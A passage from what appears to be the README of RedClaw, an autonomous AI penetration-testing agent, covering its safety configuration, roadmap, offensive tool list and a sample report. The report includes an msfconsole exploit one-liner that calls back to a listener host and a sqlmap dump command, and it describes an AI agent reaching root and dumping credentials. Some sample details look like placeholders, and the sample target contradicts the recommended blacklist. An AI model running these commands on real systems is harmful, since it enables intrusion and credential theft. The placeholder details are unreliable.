2. **Data Leakage**
   - Fully local operation - no cloud API calls
   - Encrypted credential storage
   - Secure memory wiping after sessions

3. **Scope Violations**
   - Whitelist-based target validation
   - CIDR range enforcement
   - Automatic blacklist for internal ranges

### Ethical Use Guidelines

✅ **Permitted Use Cases**
- Authorized penetration testing engagements
- Bug bounty programs (within scope)
- Security research in controlled labs
- CTF competitions
- Educational purposes on owned infrastructure

❌ **Prohibited Use Cases**
- Unauthorized access to systems
- Malicious attacks on production systems
- Privacy violations
- Illegal activities of any kind

### Configuration Recommendations

```yaml
# Recommended safe configuration
security:
  scope_validation: true
  require_confirmation: true  # Confirm before exploitation
  auto_exploit: false
  rate_limiting: true
  max_threads: 4
  network_isolation: true
  
  # Blacklist internal ranges
  blacklist_cidrs:
    - "10.0.0.0/8"
    - "172.16.0.0/12"
    - "192.168.0.0/16"
    - "127.0.0.0/8"
```

### Audit Trail

All actions are logged:

```bash
# View audit log
tail -f ~/.redclaw/logs/audit.log

# Example entry:
[2026-02-09 15:30:45] USER:admin ACTION:exploit TARGET:10.10.11.234 
TOOL:metasploit RESULT:success SESSION:abc123
```

---

## 🗺️ Roadmap

### Phase 1: MVP (Q1 2026) ✅
- [x] Core agent architecture
- [x] GLM-4.7 integration
- [x] HexStrike-AI integration
- [x] CLI interface
- [x] Basic reconnaissance & scanning
- [x] Report generation

### Phase 2: Enhanced Capabilities (Q2 2026) 🚧
- [ ] Advanced exploitation modules
- [ ] Post-exploitation automation
- [ ] BloodHound integration
- [ ] Custom skill marketplace
- [ ] Web UI dashboard
- [ ] Multi-target campaigns

### Phase 3: Enterprise Features (Q3 2026) 📋
- [ ] Team collaboration features
- [ ] SIEM integration (Splunk, ELK)
- [ ] Compliance reporting (PCI-DSS, ISO 27001)
- [ ] API for CI/CD integration
- [ ] Custom model fine-tuning
- [ ] Cloud deployment support

### Phase 4: Advanced AI (Q4 2026) 🔮
- [ ] Multi-model ensemble (GLM + Qwen + Llama)
- [ ] Reinforcement learning from pentests
- [ ] Adversarial ML resistance testing
- [ ] Zero-day discovery experiments
- [ ] Automated exploit development (PoC only)

### Research Goals
- 🎯 Achieve >80% success rate on HTB Pro Labs
- 📊 Outperform commercial tools in specific domains
- 📝 Publish research papers on AI-augmented pentesting
- 🤝 Collaborate with security community

---

## 🤝 Contributing

We welcome contributions from the security research community!

### How to Contribute

1. **Code Contributions**
   ```bash
   # Fork the repository
   git clone https://github.com/your-username/redclaw.git
   cd redclaw
   git checkout -b feature/your-feature
   
   # Make changes, test thoroughly
   pytest tests/
   
   # Submit pull request
   ```

2. **Skill Development**
   - Create custom skills for specific attack techniques
   - Submit to community skill repository
   - Document usage and examples

3. **Bug Reports**
   - Use GitHub Issues with detailed reproduction steps
   - Include logs and configuration (sanitize sensitive data)

4. **Documentation**
   - Improve tutorials and guides
   - Translate documentation
   - Create video walkthroughs

### Development Setup

```bash
# Install development dependencies
pip install -r requirements-dev.txt

# Run tests
pytest tests/ -v --cov=redclaw

# Linting & formatting
black redclaw/
flake8 redclaw/
mypy redclaw/

# Build documentation
cd docs && make html
```

### Coding Standards

- Follow PEP 8 style guide
- Type hints for all functions
- Comprehensive docstrings (Google style)
- Unit tests for all new features
- Security review for sensitive code

---

## 📚 Citations

This project builds upon groundbreaking research and open-source tools:

### Academic Papers

1. **PentestGPT** - Deng et al. (2024)
   > "Evaluating and Harnessing Large Language Models for Automated Penetration Testing"
   > USENIX Security '24

2. **HackSynth** - Muzsai et al. (2024)
   > "LLM Agent and Evaluation Framework for Autonomous Penetration Testing"
   > arXiv:2412.01778

3. **xOffense** - Luong et al. (2025)
   > "AI-driven autonomous penetration testing framework with offensive knowledge-enhanced LLMs"
   > Under review

### Open Source Projects

- **HexStrike-AI** - [@0x4m4](https://github.com/0x4m4/hexstrike-ai)
  - MCP server for 150+ cybersecurity tools

- **GLM-4 Series** - Z.AI (Zhipu AI)
  - Open-source multilingual LLM models

- **Metasploit Framework** - Rapid7
  - World's most used penetration testing framework

- **PowerShell Empire** - BC Security
  - Post-exploitation C2 framework

- **GhostPack** - [@harmj0y](https://github.com/ghostpack)
  - C# offensive security toolkit

- **BloodHound** - SpecterOps
  - Active Directory relationship mapping

- **PentestGPT** - [@GreyDGL](https://github.com/GreyDGL/PentestGPT)
  - Original LLM-based pentest framework

### Community Resources

- **Red Teaming Toolkit** - [@infosecn1nja](https://github.com/infosecn1nja/Red-Teaming-Toolkit)
- **PayloadsAllTheThings** - [@swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings)
- **SecLists** - [@danielmiessler](https://github.com/danielmiessler/SecLists)

---

## 📄 License

RedClaw is released under the **BSD 3-Clause License** with additional security research clauses.

```
BSD 3-Clause License with Security Research Addendum

Copyright (c) 2026, RedClaw Security Research Team
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice,
   this list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its contributors
   may be used to endorse or promote products derived from this software
   without specific prior written permission.

SECURITY RESEARCH ADDENDUM:
This software is intended solely for authorized security research, penetration
testing, and educational purposes. Users must:

- Obtain explicit written authorization before testing any systems
- Comply with all applicable laws and regulations
- Use the software ethically and responsibly
- Not use the software for malicious purposes

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED. IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
OTHER LIABILITY ARISING FROM THE USE OF THIS SOFTWARE.
```

---

## 📞 Contact & Support

### Community Channels

- 💬 **Discord**: [Join RedClaw Community](https://discord.gg/redclaw)
- 🐦 **Twitter**: [@RedClawSec](https://twitter.com/redclawsec)
- 📧 **Email**: security@redclaw.io
- 🌐 **Website**: https://redclaw.io

### Getting Help

1. **Documentation**: Check [Wiki](https://github.com/your-org/redclaw/wiki)
2. **Issues**: Search [GitHub Issues](https://github.com/your-org/redclaw/issues)
3. **Discussions**: Join [GitHub Discussions](https://github.com/your-org/redclaw/discussions)
4. **Commercial Support**: Contact security@redclaw.io

### Reporting Security Issues

**Do NOT open public issues for security vulnerabilities!**

Email: security@redclaw.io (PGP key on website)

We follow responsible disclosure:
- 90-day disclosure timeline
- Credit to researchers
- CVE assignment when applicable

---

## 🙏 Acknowledgments

Special thanks to:

- **Anthropic** - For advancing AI safety and Claude's capabilities
- **Z.AI (Zhipu AI)** - For open-sourcing GLM models
- **SpecterOps** - For pioneering offensive security research
- **BC Security** - For maintaining Empire framework
- **All CTF platforms** - HackTheBox, TryHackMe, PicoCTF
- **InfoSec Community** - For continuous innovation in security research

---

<div align="center">

**🦅 RedClaw - Empowering Ethical Hackers with AI 🦅**

Made with ❤️ by the Security Research Community

⭐ Star us on GitHub | 🐛 Report Issues | 🤝 Contribute

</div>

---

## Appendix A: Tool Coverage

### Complete Tool List (150+ Tools via HexStrike-AI)

<details>
<summary>Click to expand full tool list</summary>

#### Network Reconnaissance
- nmap, masscan, zmap, unicornscan
- netdiscover, arp-scan, fping
- hping3, arping

#### DNS Enumeration
- fierce, dnsrecon, dnsenum, dnsmap
- sublist3r, amass, subfinder
- massdns, altdns

#### Web Scanning
- nikto, whatweb, wapiti, skipfish
- dirb, gobuster, ffuf, feroxbuster
- wpscan, droopescan, joomscan
- nuclei (with 5000+ templates)

#### Web Exploitation
- sqlmap, nosqlmap, xxeinjector
- xsstrike, dalfox, wfuzz, commix
- sslscan, sslyze, testssl.sh

#### Password Attacks
- hashcat, john, hydra, medusa
- patator, crowbar, brutespray
- cewl, crunch, cupp

#### Wireless
- aircrack-ng suite, reaver, bully
- wifite2, fluxion, pixiewps

#### Exploitation
- metasploit, exploitdb/searchsploit
- routersploit, beef-xss
- commix, evil-winrm

#### Post-Exploitation
- mimikatz, lazagne, pypykatz
- empire, covenant, sharpshooter
- impacket suite, crackmapexec
- bloodhound, sharphound, azurehound

#### Privilege Escalation
- linpeas, winpeas, linux-exploit-suggester
- windows-exploit-suggester, powerup
- beroot, gtfobins

#### Active Directory
- ldapdomaindump, adidnsdump, kerbrute
- rubeus, certify, whisker
- sharpview, sharpwmi, sharpgpo

#### Binary Analysis
- ghidra, radare2, cutter, rizin
- ida-free, binary ninja cloud
- gdb, gef, pwndbg

#### Forensics
- volatility, rekall, foremost
- binwalk, exiftool, strings

#### Steganography
- steghide, stegcracker, zsteg
- outguess, stegsolve

#### Miscellaneous
- enum4linux, smbmap, smbclient
- rpcinfo, showmount, snmpwalk
- ldapsearch, rpcclient
- ssh-audit, telnet, nc (netcat)

</details>

---

## Appendix B: Sample Output

### Example Reconnaissance Report

```markdown
# Penetration Test Report
**Target:** 10.10.11.234
**Date:** 2026-02-09 14:30:00
**Duration:** 45 minutes
**Tester:** RedClaw Autonomous Agent v1.0

## Executive Summary

Identified **3 Critical** and **5 High** severity vulnerabilities in target system.
Successfully achieved root access through exploitation of CVE-2024-1234 followed
by kernel privilege escalation.

## Findings

### Critical - Remote Code Execution (CVE-2024-1234)
**Severity:** Critical (CVSS 9.8)
**Service:** Apache mod_proxy 2.4.52
**Status:** ✅ Exploited

Apache mod_proxy vulnerability allows unauthenticated remote code execution.
Exploited using Metasploit module `apache_mod_proxy_rce`.

**Proof of Concept:**
```bash
msfconsole -q -x "use exploit/linux/http/apache_mod_proxy_rce; 
set RHOST 10.10.11.234; set LHOST 10.10.14.5; exploit"
```

**Impact:** Complete system compromise

**Remediation:** Upgrade Apache to version 2.4.53+

---

### Critical - SQL Injection
**Severity:** Critical (CVSS 9.1)
**URL:** http://10.10.11.234/login.php
**Parameter:** username
**Status:** ✅ Exploited

Union-based SQL injection in login form allows database extraction.

**Extracted Data:**
- 15 user credentials (hashed)
- Admin session tokens
- Database schema

**SQLMap Command:**
```bash
sqlmap -u "http://10.10.11.234/login.php" --data="username=admin&password=test" 
--dump --batch
```

**Remediation:** Use parameterized queries, implement WAF

---

[... additional findings ...]

## Attack Timeline

1. **14:30** - Reconnaissance initiated
2. **14:35** - Nmap scan completed (3 open ports)
3. **14:40** - Nikto detected Apache vulnerability
4. **14:45** - Metasploit exploit successful (www-data shell)
5. **14:50** - LinPEAS identified kernel exploit
6. **15:00** - Privilege escalation to root
7. **15:05** - Credentials dumped
8. **15:10** - Flags captured
9. **15:15** - Evidence collection & cleanup

## Recommendations

1. **Immediate:** Patch Apache to latest version
2. **High Priority:** Fix SQL injection vulnerabilities
3. **High Priority:** Update kernel to patched version
4. **Medium:** Implement strong password policy
5. **Medium:** Enable WAF and IDS/IPS
6. **Low:** Harden SSH configuration

## Appendix

### Tools Used
- Nmap 7.94
- Nikto 2.5.0
- Metasploit Framework 6.3.42
- SQLMap 1.7.12
- LinPEAS 3.14.1

### Credentials Obtained
[Sanitized in report, stored securely]

### Generated by RedClaw v1.0.0
```

---

**End of Documentation**

For the latest updates, visit: https://github.com/your-org/redclaw

**Stay Safe, Test Ethically, Break Responsibly** 🦅
